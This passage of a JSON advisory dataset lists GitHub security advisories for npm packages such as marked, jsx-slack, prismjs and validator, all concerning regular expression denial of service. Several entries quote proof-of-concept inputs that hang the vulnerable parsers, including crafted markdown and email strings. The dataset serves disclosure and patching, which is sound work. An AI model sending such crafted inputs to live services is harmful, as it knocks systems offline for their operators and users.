      "description": "All versions of package djvalidator are vulnerable to Regular Expression Denial of Service (ReDoS) by sending crafted invalid emails - for example, \n`--@------------------------------------------------------------------------------------------------------------------------!`.",
      "summary": "Regular Expression Denial of Service in djvalidator",
      "date": "2022-02-09T23:15:46Z",
      "cve": "CVE-2020-7779",
      "year": 2020
   },
   {
      "package": {
         "raw": "ua-parser-js@0.7.22",
         "name": "ua-parser-js",
         "version": "0.7.22"
      },
      "id": "GHSA-394c-5j6w-4xmx",
      "description": "The package ua-parser-js before 0.7.23 are vulnerable to Regular Expression Denial of Service (ReDoS) in multiple regexes (see linked commit for more info).",
      "summary": "ua-parser-js Regular Expression Denial of Service vulnerability",
      "date": "2022-02-09T22:46:53Z",
      "cve": "CVE-2020-7793",
      "year": 2020
   },
   {
      "package": {
         "raw": "marked@4.0.9",
         "name": "marked",
         "version": "4.0.9"
      },
      "id": "GHSA-5v2h-r2cx-5xgj",
      "description": "### Impact\n\n_What kind of vulnerability is it?_\n\nDenial of service.\n\nThe regular expression `inline.reflinkSearch` may cause catastrophic backtracking against some strings.\nPoC is the following.\n\n```javascript\nimport * as marked from 'marked';\n\nconsole.log(marked.parse(`[x]: x\n\n\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](`));\n```\n\n_Who is impacted?_\n\nAnyone who runs untrusted markdown through marked and does not use a worker with a time limit.\n\n### Patches\n\n_Has the problem been patched?_\n\nYes\n\n_What versions should users upgrade to?_\n\n4.0.10\n\n### Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nDo not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.\n\n### References\n\n_Are there any links users can visit to find out more?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [marked](https://github.com/markedjs/marked)\n",
      "summary": "Inefficient Regular Expression Complexity in marked",
      "date": "2022-01-14T21:04:46Z",
      "cve": "CVE-2022-21681",
      "year": 2022
   },
   {
      "package": {
         "raw": "marked@4.0.9",
         "name": "marked",
         "version": "4.0.9"
      },
      "id": "GHSA-rrrm-qjm4-v8hf",
      "description": "### Impact\n\n_What kind of vulnerability is it?_\n\nDenial of service.\n\nThe regular expression `block.def` may cause catastrophic backtracking against some strings.\nPoC is the following.\n\n```javascript\nimport * as marked from \"marked\";\n\nmarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\n```\n\n_Who is impacted?_\n\nAnyone who runs untrusted markdown through marked and does not use a worker with a time limit.\n\n### Patches\n\n_Has the problem been patched?_\n\nYes\n\n_What versions should users upgrade to?_\n\n4.0.10\n\n### Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nDo not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.\n\n### References\n\n_Are there any links users can visit to find out more?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [marked](https://github.com/markedjs/marked)\n",
      "summary": "Inefficient Regular Expression Complexity in marked",
      "date": "2022-01-14T21:04:41Z",
      "cve": "CVE-2022-21680",
      "year": 2022
   },
   {
      "package": {
         "raw": "parse-link-header@1.0.1",
         "name": "parse-link-header",
         "version": "1.0.1"
      },
      "id": "GHSA-q674-xm3x-2926",
      "description": "The package parse-link-header before 2.0.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the checkHeader function.",
      "summary": "Uncontrolled Resource Consumption in parse-link-header",
      "date": "2022-01-06T21:37:02Z",
      "cve": "CVE-2021-23490",
      "year": 2021
   },
   {
      "package": {
         "raw": "is-my-json-valid@2.17.1",
         "name": "is-my-json-valid",
         "version": "2.17.1"
      },
      "id": "GHSA-4hpf-3wq7-5rpr",
      "description": "It was discovered that the is-my-json-valid JavaScript library used an inefficient regular expression to validate JSON fields defined to have email format. A specially crafted JSON file could cause it to consume an excessive amount of CPU time when validated.",
      "summary": "Regular expression deinal of service (ReDoS) in is-my-json-valid",
      "date": "2022-01-06T20:44:07Z",
      "cve": "CVE-2018-1107",
      "year": 2018
   },
   {
      "package": {
         "raw": "braces@2.3.0",
         "name": "braces",
         "version": "2.3.0"
      },
      "id": "GHSA-cwfw-4gq5-mrqx",
      "description": "A vulnerability was found in Braces versions prior to 2.3.1. Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.",
      "summary": "Regular Expression Denial of Service (ReDoS) in braces",
      "date": "2022-01-06T20:42:03Z",
      "cve": "CVE-2018-1109",
      "year": 2018
   },
   {
      "package": {
         "raw": "jsx-slack@4.5.1",
         "name": "jsx-slack",
         "version": "4.5.1"
      },
      "id": "GHSA-hp68-xhvj-x6j6",
      "description": "We found the patch for CVE-2021-43838 in jsx-slack v4.5.1 is insufficient to save from Regular Expression Denial of Service (ReDoS) attack.\n\nThis vulnerability affects to jsx-slack v4.5.1 and earlier versions.\n\n### Impact\n\nIf attacker can put a lot of JSX elements into `<blockquote>` tag _with including multibyte characters_, an internal regular expression for escaping characters may consume an excessive amount of computing resources.\n\n```javascript\n/** @jsxImportSource jsx-slack */\nimport { Section } from 'jsx-slack'\n\nconsole.log(\n  <Section>\n    <blockquote>\n      {[...Array(40)].map(() => (\n        <p>亜</p>\n      ))}\n    </blockquote>\n  </Section>\n)\n```\n\nv4.5.1 has released by passing the test against ASCII characters but missed the case of multibyte characters.\nhttps://github.com/yhatt/jsx-slack/security/advisories/GHSA-55xv-f85c-248q\n\n### Patches\n\njsx-slack v4.5.2 has updated regular expressions for escaping blockquote characters to prevent catastrophic backtracking. It is also including an updated test case to confirm rendering multiple tags in `<blockquote>` with multibyte characters.\n\n### References\n\n- https://github.com/yhatt/jsx-slack/commit/46bc88391d89d5fda4ce689e18ca080bcdd29ecc\n\n### Credits\n\nThanks to @hieki for finding out this vulnerability.",
      "summary": "jsx-slack insufficient patch for CVE-2021-43838 ReDoS",
      "date": "2022-01-06T18:34:18Z",
      "cve": "CVE-2021-43843",
      "year": 2021
   },
   {
      "package": {
         "raw": "jsx-slack@4.5.0",
         "name": "jsx-slack",
         "version": "4.5.0"
      },
      "id": "GHSA-55xv-f85c-248q",
      "description": "jsx-slack v4.5.1 and earlier versions are vulnerable to a regular expression denial-of-service (ReDoS) attack. \n\n### Impact\n\nIf attacker can put a lot of JSX elements into `<blockquote>` tag, an internal regular expression for escaping characters may consume an excessive amount of computing resources.\n\n```javascript\n/** @jsxImportSource jsx-slack */\nimport { Section } from 'jsx-slack'\n\nconsole.log(\n  <Section>\n    <blockquote>\n      {[...Array(40)].map((_, i) => (\n        <p>{i + 1}</p>\n      ))}\n    </blockquote>\n  </Section>\n)\n```\n\n### Patches\n\n_See also: https://github.com/yhatt/jsx-slack/security/advisories/GHSA-hp68-xhvj-x6j6_\n\njsx-slack v4.5.2 has updated regular expressions to prevent catastrophic backtracking.\n\njsx-slack v4.5.1 also had patched a workaround. It has no problems to contents with ASCII characters, but _still vulnerable to contents with multibyte characters_. (https://github.com/yhatt/jsx-slack/commit/36e4a10405e4c7745333e245fcc5029c02c7065d)\n\n### References\n\n- https://nvd.nist.gov/vuln/detail/CVE-2021-43838\n- https://github.com/yhatt/jsx-slack/commit/36e4a10405e4c7745333e245fcc5029c02c7065d\n\n### Credits\n\nThanks to @hieki for finding out this vulnerability.",
      "summary": "Regular Expression Denial of Service (ReDoS) in jsx-slack",
      "date": "2021-12-17T19:59:02Z",
      "cve": "CVE-2021-43838",
      "year": 2021
   },
   {
      "package": {
         "raw": "validator@13.6.0",
         "name": "validator",
         "version": "13.6.0"
      },
      "id": "GHSA-xx4c-jj58-r7x6",
      "description": "### Impact\nVersions of `validator` prior to 13.7.0 are affected by an inefficient Regular Expression complexity  when using the `rtrim` and `trim` sanitizers.\n\n### Patches\nThe problem has been patched in validator 13.7.0",
      "summary": "Inefficient Regular Expression Complexity in Validator.js",
      "date": "2021-11-19T20:14:23Z",
      "cve": null,
      "year": 2021
   },
   {
      "package": {
         "raw": "validator@13.6.0",
         "name": "validator",
         "version": "13.6.0"
      },
      "id": "GHSA-qgmg-gppg-76g5",
      "description": "validator.js prior to 13.7.0 is vulnerable to Inefficient Regular Expression Complexity",
      "summary": "Inefficient Regular Expression Complexity in validator.js",
      "date": "2021-11-03T17:34:45Z",
      "cve": "CVE-2021-3765",
      "year": 2021
   },
   {
      "package": {
         "raw": "ckeditor4@4.15.1",
         "name": "ckeditor4",
         "version": "4.15.1"
      },
      "id": "GHSA-wpvm-wqr4-p7cw",
      "description": "It was possible to execute a ReDoS-type attack inside CKEditor 4 before 4.16 by persuading a victim to paste crafted URL-like text into the editor, and then press Enter or Space (in the Autolink plugin).",
      "summary": "Inclusion of Functionality from Untrusted Control Sphere in CKEditor 4",
      "date": "2021-10-13T15:34:09Z",
      "cve": "CVE-2021-26272",
      "year": 2021
   },
   {
      "package": {
         "raw": "handsontable@9.0.2",
         "name": "handsontable",
         "version": "9.0.2"
      },
      "id": "GHSA-hf66-r44g-p7j9",
      "description": "The package handsontable from 0 and before 10.0.0 are vulnerable to Regular Expression Denial of Service (ReDoS) in `Handsontable.helper.isNumeric` function.",
      "summary": "Inefficient Regular Expression Complexity in handsontable",
      "date": "2021-09-30T17:10:46Z",
      "cve": "CVE-2021-23446",
      "year": 2021
   },
   {
      "package": {
         "raw": "jsoneditor@9.5.5",
         "name": "jsoneditor",
         "version": "9.5.5"
      },
      "id": "GHSA-hhfg-6hfc-rvxm",
      "description": "JSON Editor is a web-based tool to view, edit, format, and validate JSON. It has various modes such as a tree editor, a code editor, and a plain text editor. The jsoneditor package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide a crafted element as input to the getInnerText function may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.",
      "summary": "Regular Expression Denial of Service in jsoneditor",
      "date": "2021-09-29T17:15:55Z",
      "cve": "CVE-2021-3822",
      "year": 2021
   },
   {
      "package": {
         "raw": "i@0.3.6",
         "name": "i",
         "version": "0.3.6"
      },
      "id": "GHSA-x55w-vjjp-222r",
      "description": "inflect is customizable inflections for nodejs. inflect is vulnerable to Inefficient Regular Expression Complexity",
      "summary": "inflect vulnerable to Inefficient Regular Expression Complexity",
      "date": "2021-09-29T17:12:19Z",
      "cve": "CVE-2021-3820",
      "year": 2021
   },
   {
      "package": {
         "raw": "millisecond@0.1.1",
         "name": "millisecond",
         "version": "0.1.1"
      },
      "id": "GHSA-m489-xr35-fjxr",
      "description": "Versions of `millisecond` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n\n## Proof of concept\n```\nvar ms = require('millisecond');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n```\n\n\n## Recommendation\n\nUpdate to version 0.1.2 or later.",
      "summary": "Regular Expression Denial of Service in millisecond",
      "date": "2021-09-22T20:35:08Z",
      "cve": null,
      "year": 2021
   },
   {
      "package": {
         "raw": "prismjs@1.24.1",
         "name": "prismjs",
         "version": "1.24.1"
      },
      "id": "GHSA-hqhp-5p83-hx96",
      "description": "Prism is a syntax highlighting library. The prismjs package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide a crafted HTML comment as input may cause an application to consume an excessive amount of CPU.",
      "summary": "prismjs Regular Expression Denial of Service vulnerability",
      "date": "2021-09-20T20:44:48Z",
      "cve": "CVE-2021-3801",
      "year": 2021
   },
   {
      "package": {
         "raw": "@vuelidate/validators@2.0.0-alpha.21",
         "name": "validators",
         "version": "2.0.0-alpha.21",
         "scope": "vuelidate"
      },
      "id": "GHSA-vvf2-ppj9-pp49",
      "description": "vuelidate is a simple, lightweight model-based validation for Vue.js 2.x & 3.0. A ReDoS (regular expression denial of service) flaw was found in the `@vuelidate/validators` package. An attacker that is able to provide crafted input to the url(input) function may cause an application to consume an excessive amount of CPU.",
      "summary": "Inefficient Regular Expression Complexity in vuelidate",
      "date": "2021-09-20T20:42:06Z",
      "cve": "CVE-2021-3794",
      "year": 2021
   },
   {
      "package": {
         "raw": "@tarojs/helper@2.2.22",
         "name": "helper",
         "version": "2.2.22",
         "scope": "tarojs"
      },
      "id": "GHSA-468q-v4jj-485h",
      "description": "taro is vulnerable to Inefficient Regular Expression Complexity",
      "summary": "Inefficient Regular Expression Complexity in taro",
      "date": "2021-09-20T20:09:59Z",
      "cve": "CVE-2021-3804",
      "year": 2021
   },
   {
      "package": {
         "raw": "prismjs@1.23.0",
         "name": "prismjs",
         "version": "1.23.0"
      },
      "id": "GHSA-gj77-59wh-66hg",
      "description": "Some languages before 1.24.0 are vulnerable to Regular Expression Denial of Service (ReDoS).\n\n### Impact\n\nWhen Prism is used to highlight untrusted (user-given) text, an attacker can craft a string that will take a very very long time to highlight. Do not use the following languages to highlight untrusted text.\n\n- ASCIIDoc\n- ERB\n\nOther languages are __not__ affected and can be used to highlight untrusted text.\n\n### Patches\nThis problem has been fixed in Prism v1.24.\n\n### References\n\n- PrismJS/prism#2774\n- PrismJS/prism#2688\n",
      "summary": "Regular Expression Denial of Service (ReDoS) in Prism",
      "date": "2021-06-28T18:33:18Z",
      "cve": "CVE-2021-32723",
      "year": 2021
   },
   {
      "package": {
         "raw": "trim-newlines@3.0.0",
         "name": "trim-newlines",
         "version": "3.0.0"
      },
      "id": "GHSA-7p7h-4mm5-852v",
      "description": "@rkesters/gnuplot is an easy to use node module to draw charts using gnuplot and ps2pdf. The trim-newlines package before 3.0.1 and 4.x before 4.0.1 for Node.js has an issue related to regular expression denial-of-service (ReDoS) for the `.end()` method.",
      "summary": "Uncontrolled Resource Consumption in trim-newlines",
      "date": "2021-06-07T22:10:39Z",
      "cve": "CVE-2021-33623",
      "year": 2021
   },
   {
      "package": {
         "raw": "dat.gui@0.7.7",
         "name": "dat.gui",
         "version": "0.7.7"
      },
      "id": "GHSA-chwr-hf3w-c984",
      "description": "All versions of package dat.gui are vulnerable to Regular Expression Denial of Service (ReDoS) via specifically crafted rgb and rgba values.",
      "summary": "Regular Expression Denial of Service in dat.gui",
      "date": "2021-05-10T18:44:38Z",
      "cve": "CVE-2020-7755",
      "year": 2020
   },
   {
      "package": {
         "raw": "postcss@7.0.35",
         "name": "postcss",
         "version": "7.0.35"
      },
      "id": "GHSA-hwj9-h5mp-3pm3",
      "description": "The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.",
      "summary": "Regular Expression Denial of Service in postcss",
      "date": "2021-05-10T15:29:24Z",
      "cve": "CVE-2021-23368",
      "year": 2021
   },
   {
      "package": {
         "raw": "ua-parser-js@0.7.21",
         "name": "ua-parser-js",
         "version": "0.7.21"
      },
      "id": "GHSA-662x-fhqg-9p8v",
      "description": "The package ua-parser-js before 0.7.22 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.",
      "summary": "Regular Expression Denial of Service in ua-parser-js",
      "date": "2021-05-07T16:18:19Z",
      "cve": "CVE-2020-7733",
      "year": 2020
   },
   {
      "package": {
         "raw": "es6-crawler-detect@3.1.2",
         "name": "es6-crawler-detect",
         "version": "3.1.2"
      },
      "id": "GHSA-jxg6-fhwc-9v9c",
      "description": "This affects the package es6-crawler-detect before 3.1.3. No limitation of user agent string length supplied to regex operators.",
      "summary": "Regular Expression Denial of Service (ReDoS) in es6-crawler-detect",
      "date": "2021-04-13T15:19:39Z",
      "cve": "CVE-2020-28501",
      "year": 2020
   },
   {
      "package": {
         "raw": "@ckeditor/ckeditor5-engine@26.0.0",
         "name": "ckeditor5-engine",
         "version": "26.0.0",
         "scope": "ckeditor"
      },
      "id": "GHSA-3rh3-wfr4-76mj",
      "description": "\n### Impact\nA regular expression denial of service (ReDoS) vulnerability has been discovered in multiple CKEditor 5 packages. The vulnerability allowed to abuse particular regular expressions, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 packages listed above at version <= 26.0.0.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 27.0.0.\n\n### For more information\nEmail us at security@cksource.com if you have any questions or comments about this advisory.\n\n### Acknowledgements\nThe CKEditor 5 team would like to thank Yeting Li for recognizing and reporting these vulnerabilities.",
      "summary": "Regular expression Denial of Service in multiple packages",
      "date": "2021-04-06T17:28:41Z",
      "cve": "CVE-2021-21391",
      "year": 2021
   },
   {
      "package": {
         "raw": "schema-inspector@1.7.0",
         "name": "schema-inspector",
         "version": "1.7.0"
      },
      "id": "GHSA-f38p-c2gq-4pmr",
      "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\nEmail address validation is vulnerable to a denial-of-service attack where some input (for example `a@0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.`) will freeze the program or web browser page executing the code. This affects any current schema-inspector users using any version to validate email addresses. Users who do not do email validation, and instead do other types of validation (like string min or max length, etc), are not affected.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\nUsers should upgrade to version 2.0.0, which uses a regex expression that isn't vulnerable to ReDoS. The new regex expression is more limited in what it can check, so it is more flexible than the one used before. Therefore, this was a new major version instead of a new patch version to warn people upgrading that they should make sure the email validation still works for their use case. \n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\nIf a user chooses to not upgrade, the only known workaround would be to stop using the email validation feature in the library. The user could, for example, accept the email address into their system but save it in a \"not yet validated\" state in their system until a verification email is sent to it (to determine whether the email is valid and belongs to the form submitter). Note that this is the preferred way of validating email addresses anyways.\n\n### References\n_Are there any links users can visit to find out more?_\nhttps://gist.github.com/mattwelke/b7f42424680a57b8161794ad1737cd8f\n\n### For more information\nIf you have any questions or comments about this advisory, you can create an issue in this repository.",
      "summary": "Regular Expression Denial-of-Service in npm schema-inspector",
      "date": "2021-03-19T20:14:21Z",
      "cve": "CVE-2021-21267",
      "year": 2021
   },
   {
      "package": {
         "raw": "@progfay/scrapbox-parser@6.0.2",
         "name": "scrapbox-parser",
         "version": "6.0.2",
         "scope": "progfay"
      },
      "id": "GHSA-9fhw-r42p-5c7r",
      "description": "### Impact\n\nA [Regular expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) flaw was found in the @progfay/scrapbox-parser package before 6.0.3, 7.0.2 for Node.js.\nThe attacker that is able to be parsed a specially crafted text may cause the application to consume an excessive amount of CPU.\n\n### Patches\n\nUpgrade to version 6.0.3, 7.0.2 or later.\n\n### Workarounds\n\nAvoid to parse text with a lot of `[` chars.\n\n### References\n\n* https://github.com/progfay/scrapbox-parser/pull/519\n* https://github.com/progfay/scrapbox-parser/pull/539\n* https://github.com/progfay/scrapbox-parser/pull/540\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-27405\n* https://snyk.io/vuln/SNYK-JS-PROGFAYSCRAPBOXPARSER-1076803\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/progfay/scrapbox-parser](https://github.com/progfay/scrapbox-parser/issues)",
      "summary": "Regular expression Denial of Service in @progfay/scrapbox-parser",
      "date": "2021-03-01T20:44:44Z",
      "cve": "CVE-2021-27405",
      "year": 2021
   },
   {
      "package": {
         "raw": "prismjs@1.22.0",
         "name": "prismjs",
         "version": "1.22.0"
      },
      "id": "GHSA-h4hr-7fg3-h35w",
      "description": "The package prismjs before 1.23.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `prism-asciidoc`, `prism-rest`, `prism-tap` and `prism-eiffel` components.",
      "summary": "Denial of service in prismjs",
      "date": "2021-03-01T19:52:33Z",
      "cve": "CVE-2021-23341",
      "year": 2021
   },
   {
      "package": {
         "raw": "marked@0.6.0",
         "name": "marked",
         "version": "0.6.0"
      },
      "id": "GHSA-7m7q-q53v-j47v",
      "description": "A flaw was found in nodejs-marked versions from 0.5.0 to before 0.6.1. Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). Input to the host variable is vulnerable when input contains parenthesis in link URIs, coupled with a high number of link tokens in a single line.",
      "summary": "Regular Expression Denial of Service",
      "date": "2021-02-25T02:01:47Z",
      "cve": null,
      "year": 2021
   },
   {
      "package": {
         "raw": "uap-core@0.10.0",
         "name": "uap-core",
         "version": "0.10.0"
      },
      "id": "GHSA-p4pj-mg4r-x6v4",
      "description": "## Impact\n\nSome regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.\n\n## Patches\n\nPlease update uap-core to >= v0.11.0\n\nDownstream packages such as uap-python, uap-ruby etc which depend upon uap-core follow different version schemes.",
      "summary": "Denial of Service in uap-core",
      "date": "2021-02-02T15:46:38Z",
      "cve": "CVE-2021-21317",
      "year": 2021
   },
   {
      "package": {
         "raw": "@ckeditor/ckeditor5-markdown-gfm@24.0.0",
         "name": "ckeditor5-markdown-gfm",
         "version": "24.0.0",
         "scope": "ckeditor"
      },
      "id": "GHSA-hgmg-hhc8-g5wr",
      "description": "### Impact\nA regular expression denial of service (ReDoS) vulnerability has been discovered in the CKEditor 5 Markdown plugin code. The vulnerability allowed to abuse a link recognition regular expression, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 Markdown plugin at version <= 24.0.0. \n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version 25.0.0.\n\n### Workarounds\nThe user can work around the issue by:\n- Upgrading CKEditor 5 to version 25.0.0.\n- Disabling the Markdown plugin.\n\n### More information\nIf you have any questions or comments about this advisory:\n* Email us at [security@cksource.com](mailto:security@cksource.com)\n\n### Acknowledgements\nThe CKEditor 5 team would like to thank Erik Krogh Kristensen from the GitHub team for recognizing this vulnerability and \nAlvaro Muñoz from GitHub for reporting it.",
      "summary": "CKEditor 5 Markdown plugin Regular expression Denial of Service",
      "date": "2021-01-29T21:51:22Z",
      "cve": "CVE-2021-21254",
      "year": 2021
   },
   {
      "package": {
         "raw": "jquery-validation@1.19.2",
         "name": "jquery-validation",
         "version": "1.19.2"
      },
      "id": "GHSA-jxwx-85vp-gvwm",
      "description": "The GitHub Security Lab team has identified potential security vulnerabilities in jquery.validation.\n\nThe project contains one or more regular expressions that are vulnerable to ReDoS (Regular Expression Denial of Service)\n\nThis issue was discovered and reported by GitHub team member @erik-krogh (Erik Krogh Kristensen).",
      "summary": "Regular Expression Denial of Service in jquery-validation",
      "date": "2021-01-13T18:21:54Z",
      "cve": "CVE-2021-21252",
      "year": 2021
   },
   {
      "package": {
         "raw": "tinymce@5.5.1",
         "name": "tinymce",
         "version": "5.5.1"
      },
      "id": "GHSA-h96f-fc7c-9r55",
      "description": "### Impact\nA regex denial of service (ReDoS) vulnerability was discovered in a dependency of the `codesample` plugin. The vulnerability allowed poorly formed ruby code samples to lock up the browser while performing syntax highlighting. This impacts users of the `codesample` plugin using TinyMCE 5.5.1 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 5.6.0 by upgrading to a version of the dependency without the vulnerability.\n\n### Workarounds\nTo work around this vulnerability, either:\n- Upgrade to TinyMCE 5.6.0 or higher\n- Disable the `codesample` plugin\n- Disable ruby code samples using the [codesample_languages](https://www.tiny.cloud/docs/plugins/opensource/codesample/#exampleusingcodesample_languages) setting\n- Override the PrismJS syntax highlighter to version 1.21.0 or higher using the [codesample_global_prismjs](https://www.tiny.cloud/docs/plugins/opensource/codesample/#codesample_global_prismjs) setting\n\n### Acknowledgements\nTiny Technologies would like to thank Erik Krogh Kristensen at GitHub for discovering this vulnerability.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes56/#securityfixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [TinyMCE repo](http://github.com/tinymce/tinymce/issues)\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",
      "summary": "Regex denial of service vulnerability in codesample plugin",
      "date": "2021-01-06T19:25:46Z",
      "cve": null,
      "year": 2021
   },
   {
      "package": {
         "raw": "highlight.js@9.18.5",
         "name": "highlight.js",
         "version": "9.18.5"
      },
      "id": "GHSA-7wwv-vh3v-89cq",
      "description": "### Impact: Potential ReDOS vulnerabilities (exponential and polynomial RegEx backtracking)\n\n[oswasp](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS): \n\n> The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\n\nIf are you are using Highlight.js to highlight user-provided data you are possibly vulnerable.  On the client-side (in a browser or Electron environment) risks could include lengthy freezes or crashes... On the server-side infinite freezes could occur... effectively preventing users from accessing your app or service (ie, Denial of Service).\n\nThis is an issue with grammars shipped with the parser (and potentially 3rd party grammars also), not the parser itself. If you are using Highlight.js with any of the following grammars you are vulnerable.  If you are using `highlightAuto` to detect the language (and have any of these grammars registered) you are vulnerable. Exponential grammars (C, Perl, JavaScript) are auto-registered when using the common grammar subset/library `require('highlight.js/lib/common')` as of 10.4.0 - see https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.4.0/build/highlight.js\n\nAll versions prior to 10.4.1 are vulnerable, including version 9.18.5. \n\n**Grammars with exponential backtracking issues:**\n\n  - c-like (c, cpp, arduino)\n  - handlebars (htmlbars)\n  - gams\n  - perl\n  - jboss-cli\n  - r\n  - erlang-repl\n  - powershell\n  - routeros\n  - livescript (10.4.0 and 9.18.5 included this fix)\n  - javascript & typescript (10.4.0 included partial fixes)\n\nAnd of course any aliases of those languages have the same issue. ie: `hpp` is no safer than `cpp`.\n\n**Grammars with polynomial backtracking issues:**\n\n- kotlin\n- gcode\n- d\n- aspectj\n- moonscript\n- coffeescript/livescript\n- csharp\n- scilab\n- crystal\n- elixir\n- basic\n- ebnf\n- ruby\n- fortran/irpf90\n- livecodeserver\n- yaml\n- x86asm\n- dsconfig\n- markdown\n- ruleslanguage\n- xquery\n- sqf\n\nAnd again: any aliases of those languages have the same issue. ie: `ruby` and `rb` share the same ruby issues.\n\n\n### Patches\n\n- Version 10.4.1 resolves these vulnerabilities.  Please upgrade.\n\n### Workarounds / Mitigations\n\n- Discontinue use the affected grammars. (or perhaps use only those with poly vs exponential issues)\n- Attempt cherry-picking the grammar fixes into older versions...\n- Attempt using newer CDN versions of any affected languages.  (ie using an older CDN version of the library with newer CDN grammars).  Your mileage may vary.\n\n### References\n\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue: https://github.com/highlightjs/highlight.js/issues\n* Email us at [security@highlightjs.com](mailto:security@highlightjs.com)",
      "summary": "ReDOS vulnerabities: multiple grammars",
      "date": "2020-12-04T16:47:20Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "npm-user-validate@1.0.0",
         "name": "npm-user-validate",
         "version": "1.0.0"
      },
      "id": "GHSA-xgh6-85xh-479p",
      "description": "`npm-user-validate` before version `1.0.1` is vulnerable to a Regular Expression Denial of Service (REDos). The regex that validates user emails took exponentially longer to process long input strings beginning with `@` characters.\n\n### Impact\nThe issue affects the `email` function. If you use this function to process arbitrary user input with no character limit the application may be susceptible to Denial of Service.\n\n### Patches\nThe issue is patched in version 1.0.1 by improving the regular expression used and also enforcing a 254 character limit.\n\n### Workarounds\nRestrict the character length to a reasonable degree before passing a value to `.emal()`; Also, consider doing a more rigorous sanitizing/validation beforehand.",
      "summary": "Regular Expression Denial of Service in npm-user-validate",
      "date": "2020-10-16T18:56:26Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "simple-markdown@0.5.1",
         "name": "simple-markdown",
         "version": "0.5.1"
      },
      "id": "GHSA-4xf9-pgvv-xx67",
      "description": "Versions of `simple-markdown` prior to 0.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS). The `SimpleMarkdown.defaultInlineParse()` function has significantly degraded performance when parsing inline code blocks.\n\n\n## Recommendation\n\nUpgrade to version 0.5.2 or later.",
      "summary": "Regular Expression Denial of Service in simple-markdown",
      "date": "2020-09-03T20:27:46Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "marked@0.6.3",
         "name": "marked",
         "version": "0.6.3"
      },
      "id": "GHSA-ch52-vgq2-943f",
      "description": "Affected versions of `marked` are vulnerable to Regular Expression Denial of Service (ReDoS). The `_label` subrule may significantly degrade parsing performance of malformed input.\n\n\n## Recommendation\n\nUpgrade to version 0.7.0 or later.",
      "summary": "Regular Expression Denial of Service in marked",
      "date": "2020-09-03T18:15:53Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "websocket-extensions@0.1.3",
         "name": "websocket-extensions",
         "version": "0.1.3"
      },
